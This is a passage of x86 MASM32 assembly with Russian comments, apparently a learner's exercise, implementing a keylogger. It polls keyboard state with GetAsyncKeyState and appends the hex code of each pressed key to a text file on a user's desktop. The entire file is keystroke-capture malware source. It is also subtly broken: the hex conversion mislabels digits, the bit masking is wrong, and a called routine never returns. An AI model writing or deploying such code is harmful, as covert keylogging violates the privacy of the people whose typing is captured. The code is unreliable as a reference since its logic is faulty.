.386
.model flat, stdcall
option casemap :none


include \masm32\include\kernel32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib

.data

Printed_text db 'Pressed', 0
Console_handle dd ?
;Машинное слово = разряд процессора
;Тут ворд это 16бит всегда. Не надо путать

Buffer db 100h dup (?)

Lp_file_name db 'C:\Users\Teacher\Desktop\data.txt', 0

.code
start:

    ;Получение хенда консоли
    push -11
    call GetStdHandle
    mov Console_handle ,eax

Start_cycle:
    ;Пауза на 1 миллисекунду
    mov esi, 30h ;
    push 1
    call Sleep

Check_key:
    cmp esi, 05Bh ;Если esi стал указывать на номер символов которые не нужны
    jz Start_cycle

    ;Проверка была ли нажата клавиша
    push esi
    call GetAsyncKeyState
    
    cmp eax, 0           ;is pressed eax 	!= 0
    jnz Key_pressed     ;Если нажата вызываем нашу процедуру обработки нажатий

Continue:

    inc esi              ;Теперь esi указывает на другую виртуальную клавишу
    jmp Check_key  
    

Key_pressed:
 cmp esi, 041h
 jz Exit
 call Write_to_file
 jmp Continue    


Write_to_file:
    ;Получение ASCI кода символа нажатой клавиши
    push 0   
    push esi
    call MapVirtualKey
    shl eax, 16

    push 100h
    push offset Buffer 
    push eax
    call GetKeyNameTextA

    ;Получение дескриптора файла
    push 0 ;-------------------------------------------------------------------------------
    push 80h
    push 4
    push 0 ;-------------------------------------------------------------------------------
    push 0 ;? if not work - it should push 2(is problems with acces)
    push 40000000h;?  winnt.h -------------------------------------------------------------------------------
    push offset Lp_file_name
    call CreateFile
            ;eax = file handler
    cmp eax, 0
    jz Exit
    mov ebx, eax
    
    
    ;Установка указателя
    push 2
    push 0
    push 0
    push ebx
    call SetFilePointer    

    ;Не стал определять длину т.к после нажатия клавиши сразу же записываем символ (ASCI = 1байт)

    
    ;Пишем в файл
    
    call GetLastError

    call Get_numbers_asci ;параметром принимает esi 
    mov word ptr [Buffer], ax ;можно также mov dword [Buffer], eax изза хранения в памяти обратным образом могут быть баги

    push 0      ;-------------------------------------------------------------------------------
    push 0      ; was lpOverlapped
    push 02h    ;при записи номера виртуальной клавиши должен писатся 2байта
    push offset Buffer
    push ebx
    call WriteFile

    call GetLastError

    ;Закрываем дескриптор
    push ebx
    call CloseHandle

    push 100
    call Sleep
    ;на начало цикла
    jmp Start_cycle
    
Print_message proc
        
    push 0
    push 0
    push 16d
    push offset Printed_text
    push Console_handle
    call WriteConsoleA
    
    ret
Print_message endp

Get_numbers_asci proc
;параметр передается через регистр esi а нечерез stdcall
    push ebp
    mov ebp, esp
    sub esp, 4

    mov [ebp-4], esi ;локальбная переменная равная esi 

 
    ;максимальное - 5A (занимает 2 байта)

    ;чтобы взять первое число shr esi, 4  res  - 0000000Nh
    shr esi, 4    
    ;esi укзазывает на первое число
    call Number_to_asci ;Принимает параметром esi. Возвращает eax = asci коду
    
    
    ;Восстановим значение esi
    mov esi, [ebp-4]

    ;созраняем значение eax в локальную переменную
    mov [ebp-4], eax


    ;Освобождаем место для второго числа. 000n -> 00n0
    shl dword ptr [ebp-4], 8 ;?
    

    ;Берем второе число
    btr esi, 5
    btr esi, 6
    btr esi, 7
    btr esi, 8
    ;esi укзаывает на второе число

    call Number_to_asci
    ;eax = asci код второго числа
    ;как нибудь поместить младший байт регистра eax в младший байт [ebp-4]
    mov [ebp-4], al ;?


    ;вместо локальой переменной использовать реигстры

    ;Возврат
    mov eax, [ebp-4]
    mov esp, ebp
    pop ebp
    ret 
Get_numbers_asci endp

Number_to_asci proc
    ;Седалть с помощью цикла

    ;stdcall не прмиеняется
    ;параметр преедается чверез регистр esi
    cmp esi, 0
    jz Zero_to_asci

    cmp esi, 1
    jz One_to_asci

    cmp esi, 2
    jz Two_to_asci

    cmp esi, 3
    jz Three_to_asci

    cmp esi, 4
    jz Four_to_asci

    cmp esi, 5
    jz Five_to_asci

    cmp esi, 6
    jz Six_to_asci

    cmp esi, 7
    jz Seven_to_asci

    cmp esi, 8
    jz Eight_to_asci

    cmp esi, 9
    jz Nine_to_asci

    cmp esi, 0Ah
    jz A_to_asci

    cmp esi, 0Bh
    jz B_to_asci

    cmp esi, 0Ch
    jz C_to_asci

    cmp esi, 0Dh
    jz D_to_asci
    
    jmp F_to_asci

    

Zero_to_asci:
    mov eax, 30h
    jmp Return

One_to_asci:
    mov eax, 31h
    jmp Return

Two_to_asci:
    mov eax, 32h
    jmp Return

Three_to_asci:
    mov eax, 33h
    jmp Return

Four_to_asci:
    mov eax, 34h
    jmp Return

Five_to_asci:
    mov eax, 35h
    jmp Return

Six_to_asci:
    mov eax, 36h
    jmp Return

Seven_to_asci:
    mov eax, 37h
    jmp Return

Eight_to_asci:
    mov eax, 38h
    jmp Return

Nine_to_asci:
    mov eax, 39h
    jmp Return

A_to_asci:
    mov eax, 41h
    jmp Return

B_to_asci:
    mov eax, 42h
    jmp Return

C_to_asci:
    mov eax, 43h
    jmp Return

D_to_asci:
    mov eax, 44h
    jmp Return

F_to_asci:
    mov eax, 45h
    jmp Return
    
Return:
    ret
   ;возращаемое значение в eax
Number_to_asci endp

Exit:
    push 0
    call ExitProcess

end start
